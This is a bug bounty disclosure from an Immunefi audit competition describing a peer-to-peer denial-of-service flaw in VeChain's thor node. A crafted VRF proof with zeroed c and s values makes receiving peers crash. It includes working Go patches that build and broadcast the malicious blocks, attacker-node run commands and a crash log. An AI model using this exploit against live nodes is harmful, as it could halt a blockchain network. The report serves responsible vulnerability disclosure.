# 57055 bc medium dos via p2p during block header validation using bad proof

**Submitted on Oct 23rd 2025 at 04:37:38 UTC by @emarai for** [**Attackathon | VeChain Hayabusa Upgrade**](https://immunefi.com/audit-competition/vechain-hayabusa-upgrade-attackathon)

* **Report ID:** #57055
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/vechain/thor/compare/v2.3.2...release/hayabusa>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

### Brief/Intro

Malicious node is able to crash their peers using bad signature proof, causing network shutdown.

### Vulnerability Details

During block validation the receiving node will check if the header proof is correct. The validation code will call `Beta()` which will call `vrf.Verify`. The `Verify()` function will cause the node crash if provided a bad proof. What is a bad proof here? The bad proof is a proof with a valid `gamma`, but with invalid `c` and `s` (all-zero `c` and `s`). For more details, see the PoC section.

Relevant code snippets:

```
func (c *Consensus) validateBlockHeader(header *block.Header, parent *block.Header, nowTimestamp uint64) error {

...

		if _, err := header.Beta(); err != nil {
			return consensusError(fmt.Sprintf("block VRF signature invalid: %v", err))
		}
```

```
func (h *Header) Beta() (beta []byte, err error) {

   ...

	return vrf.Verify(pub, h.body.Extension.Alpha, ComplexSignature(h.body.Signature).Proof())
}
```

## Impact Details

An attacker can deliberately send a block with a bad proof (all zero c and s) and crash the receiving target node. Anyone can send any block, and the receiving end will validate it, making this a practical denial-of-service vector.

## References

* <https://github.com/vechain/thor/blob/9467aff0f1eb5aedb2c113f096e2cc2531fa3e82/consensus/validator.go#L140>
* <https://github.com/vechain/thor/blob/9467aff0f1eb5aedb2c113f096e2cc2531fa3e82/block/header.go#L254>

## Proof of Concept

### Honest network

Let's use the networkhub for the honest network.

```
git clone https://github.com/vechain/networkhub
cd networkhub
```

Copy this file into cmd/main.go

```
package main

import (
	"log"

	"github.com/vechain/networkhub/client"
	"github.com/vechain/networkhub/preset"
	"github.com/vechain/networkhub/thorbuilder"
)

func main() {
	// Step 1: Use a preset network configuration (3 nodes local network)
	network := preset.LocalThreeNodesNetwork()

	// Step 2: Configure thor builder for automatic binary management
	cfg := thorbuilder.DefaultConfig()
	network.ThorBuilder = cfg

	// Step 3: Create client and start network
	client, err := client.New(network)
	if err != nil {
		log.Fatal(err)
	}
	defer client.Stop()

	// Step 4: Start the network
	err = client.Start()
	if err != nil {
		log.Fatal(err)
	}

	log.Println("✅ 3-node VeChain network started successfully!")
	log.Printf("🌐 First node API: %s", network.Nodes[0].GetHTTPAddr())

	// Your network is ready for use!
	// The thor binary is automatically downloaded and built
	// All nodes are configured with genesis, keys, and networking
	for {
	}
}
```

Run the honest network using this, keep it in the background:

```
go run ./cmd/main.go
```

### Attacker node

Clone the current thor node, current commit is fd2b8d4b338c3d2b9bd947f5e1802f5e9383fed5

```
git clone https://github.com/vechain/thor/tree/master
```

{% stepper %}
{% step %}

### Attack path — make the attacker always pack and use a bad proof

* Skip the packer loop check if current key is validator (always pack).
* Modify the created block with a bad proof (gamma valid, c and s all zeros).

These two changes are applied in the PoC patch shown below.
{% endstep %}

{% step %}

### Code for encoding/decoding and replacing the proof

Add the following helper code (used to decode the original proof and re-encode with zeroed c and s):

```go
type point struct {
    X, Y *big.Int
}

func Unmarshal(in []byte) *point {
    if x, y := gosecp256k1.DecompressPubkey(in); x != nil && y != nil {
        return &point{x, y}
    }
    return nil
}

func DecodeProof(pi []byte) (gamma *point, C, S *big.Int, cbytes []byte, sbytes []byte, err error) {
    var (
        ptlen = (crypto.S256().Params().BitSize+7)/8 + 1
        clen  = ((crypto.S256().Params().P.BitLen()+1)/2 + 7) / 8
        slen  = (crypto.S256().Params().N.BitLen() + 7) / 8
    )
    if len(pi) != ptlen+clen+slen {
        err = errors.New("invalid proof length")
        return
    }

    if gamma = Unmarshal(pi[:ptlen]); gamma == nil {
        err = errors.New("invalid point")
        return
    }

    cbytes = pi[ptlen : ptlen+clen]
    sbytes = pi[ptlen+clen:]
    C = new(big.Int).SetBytes(pi[ptlen : ptlen+clen])
    S = new(big.Int).SetBytes(pi[ptlen+clen:])
    return
}

func EncodeProofAgain(gamma *point, cbytes []byte, sbytes []byte) []byte {
    gammaBytes := elliptic.MarshalCompressed(gosecp256k1.S256(), gamma.X, gamma.Y)
    return append(append(gammaBytes, cbytes...), sbytes...)
}
```

{% endstep %}

{% step %}

### Integrate the modified proof into the packer flow

In `packer/flow.go` replace the normal proof usage with a constructed proof where c and s are zero bytes:

```go
// @ATTACKER invalid proof
gamma, _, _, cbytes, sbytes, _ := DecodeProof(proof)

// note: empty bytes
new_cbytes := make([]byte, len(cbytes))
new_sbytes := make([]byte, len(sbytes))
newProof := EncodeProofAgain(gamma, new_cbytes, new_sbytes)

sig, err := block.NewComplexSignature(ec, newProof)
if err != nil {
    return nil, nil, nil, err
}
```

This will create a signature/proof whose gamma is valid but whose c and s are zeroed.
{% endstep %}
{% endstepper %}

Also the PoC patches modify packer loop and propagation to make the attacker more likely to propose and broadcast blocks. Example diffs (applied in PoC):

* `cmd/thor/node/packer_loop.go` — force pack condition to true
* `comm/communicator.go` — propagate to all peers instead of subset
* `poa/sched_v2.go` — bypass proposer checks

(Full patch snippets are included in the original PoC description and reproduced below.)

Patch excerpts applied in PoC (selected hunks):

```
# cmd/thor/node/packer_loop.go
-            if uint64(time.Now().Unix())+thor.BlockInterval()/2 > flow.When() {
+            if true || uint64(time.Now().Unix())+thor.BlockInterval()/2 > flow.When() {
```

```
# comm/communicator.go
-    p := int(math.Sqrt(float64(len(peers))))
-    toPropagate := peers[:p]
+    toPropagate := peers[:]
```

```
# packer/flow.go
-    sig, err := block.NewComplexSignature(ec, proof)
+    // @ATTACKER invalid proof
+    gamma, _, _, cbytes, sbytes, _ := DecodeProof(proof)
+
+    // note: empty bytes
+    new_cbytes := make([]byte, len(cbytes))
+    new_sbytes := make([]byte, len(sbytes))
+    newProof := EncodeProofAgain(gamma, new_cbytes, new_sbytes)
+
+    sig, err := block.NewComplexSignature(ec, newProof)
```

### Genesis file for the local attacker network

Save this as `genesis_local.json`:

```
{
  "accounts": [
    {
      "address": "0x7567d83b7b8d80addcb281a71d54fc7b3364ffed",
      "balance": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
      "code": "",
      "energy": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
      "storage": null
    },
    {
      "address": "0x61ff580b63d3845934610222245c116e013717ec",
      "balance": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
      "code": "",
      "energy": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
      "storage": null
    },
    {
      "address": "0x327931085b4ccbce0baabb5a5e1c678707c51d90",
      "balance": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
      "code": "",
      "energy": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
      "storage": null
    },
    {
      "address": "0x084e48c8ae79656d7e27368ae5317b5c2d6a7497",
      "balance": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
      "code": "",
      "energy": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
      "storage": null
    }
  ],
  "authority": [
    {
      "endorsorAddress": "0x7567d83b7b8d80addcb281a71d54fc7b3364ffed",
      "identity": "0x000000000000000068747470733a2f2f636f6e6e65782e76656368612e696e2f",
      "masterAddress": "0x61ff580b63d3845934610222245c116e013717ec"
    },
    {
      "endorsorAddress": "0x7567d83b7b8d80addcb281a71d54fc7b3364ffed",
      "identity": "0x000000000000000068747470733a2f2f656e762e7665636861696e2e6f72672f",
      "masterAddress": "0x327931085b4ccbce0baabb5a5e1c678707c51d90"
    },
    {
      "endorsorAddress": "0x7567d83b7b8d80addcb281a71d54fc7b3364ffed",
      "identity": "0x0000000000000068747470733a2f2f617070732e7665636861696e2e6f72672f",
      "masterAddress": "0x084e48c8ae79656d7e27368ae5317b5c2d6a7497"
    }
  ],
  "executor": {
    "approvers": [
      {
        "address": "0x199b836d8a57365baccd4f371c1fabb7be77d389",
        "identity": "0x00000000000067656e6572616c20707572706f736520626c6f636b636861696e"
      }
    ]
  },
  "extraData": "",
  "forkConfig": {
    "BLOCKLIST": 0,
    "ETH_CONST": 0,
    "ETH_IST": 0,
    "FINALITY": 0,
    "GALACTICA": 0,
    "VIP191": 0,
    "VIP214": 0
  },
  "gaslimit": 10000000,
  "launchTime": 1703180212,
  "params": {
    "baseGasPrice": "0x38d7ea4c68000",
    "executorAddress": null,
    "maxBlockProposers": null,
    "proposerEndorsement": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
    "rewardRatio": "0x429d069189e0000"
  }
}
```

Build and run the attacker node:

```
make thor
./bin/thor --network genesis_local.json --api-addr 127.0.0.1:8135 --nat none --p2p-port 8035 --bootnode "enode://2ac08a2c35f090e5c47fe99bb0b2956d5b3366c61a83ef30719d393b5984227f4a5bb35b42fef94c3c03c1797ddd97546bb6eeb627b040c4c8dd554b4289024d@127.0.0.1:8031,enode://ca36cbb2e9ad0ed582350ee04f49408f4fa409a8ca39982a34e4d5bb82418c45f3fd74bc4861f5aaecd986f1697f28010e1f6af7fadf08c6f529188752f47bee@127.0.0.1:8032,enode://2d5b5f39e906dd717d721e3f039326e55163697e99e0a9998193eddfbb42e21a457ab877c355ee89c2bdf2562c86f6946b1e98119e945c091cab1a5ded8ca027@127.0.0.1:8033" --data-dir ./new-data-dir-1
```

<details>

<summary><strong>Crash log (honest node)</strong></summary>

```
[node3] panic: runtime error: invalid memory address or nil pointer dereference
[node3] [signal SIGSEGV: segmentation violation code=0x2 addr=0x0 pc=0x102f0a174]
[node3] goroutine 1451 [running]:
[node3] math/big.(*Int).Sub(0x14112660480, 0x1030cf4f8?, 0x14112647a70?)
    /Users/irfi/go/pkg/mod/golang.org/toolchain@v0.0.1-go1.24.2.darwin-arm64/src/math/big/int.go:164 +0x24
[node3] github.com/vechain/go-ecvrf.(*core).Sub(0x14110903de0, 0x14110903e28, 0x14112636a60)
    /Users/irfi/go/pkg/mod/github.com/vechain/go-ecvrf@v0.0.0-20220525125849-96fa0442e765/core.go:79 +0x60
[node3] github.com/vechain/go-ecvrf.(*vrf).Verify(0x14110903ed8?
    , 0x14112660320, {0x14112e9cf00, 0x20, 0x20}, {0x14112eb2181?, 0x4105c2f3b7d699bf?, 0xb2802ee345931917?})
    /Users/irfi/go/pkg/mod/github.com/vechain/go-ecvrf@v0.0.0-20220525125849-96fa0442e765/vrf.go:152 +0x128
[node3] github.com/vechain/thor/v2/vrf.Verify(...)
    /var/folders/f0/nvvsk4_j457cq9sq77l4h7vw0000gn/T/thor_master_reusable/vrf/vrf.go:38
[node3] github.com/vechain/thor/v2/block.(*Header).Beta(0x14112ead4a0)
    /var/folders/f0/nvvsk4_j457cq9sq77l4h7vw0000gn/T/thor_master_reusable/block/header.go:254 +0x1c8
[node3] github.com/vechain/thor/v2/comm.decodeAndWarmupBatches.func1.1()
    /var/folders/f0/nvvsk4_j457cq9sq77l4h7vw0000gn/T/thor_master_reusable/comm/sync.go:130 +0x34
[node3] github.com/vechain/thor/v2/co.Parallel.func1()
    /var/folders/f0/nvvsk4_j457cq9sq77l4h7vw000c/co/parallel.go:26 +0x48
[node3] created by github.com/vechain/thor/v2/co.Parallel in goroutine 1448
    /var/folders/f0/nvvsk4_j457cq9sq77l4h7vw000c/co/parallel.go:24
    +0xb0
```

</details>

## Notes / Observations

* The crash occurs inside the VRF verify routine when provided a malformed proof: gamma present, but c and s zeroed. The code path leads to a nil pointer dereference in math/big operations inside go-ecvrf.
* Because block headers are validated upon receipt and any peer can send blocks via P2P, this allows an attacker to crash peers by sending such crafted blocks.
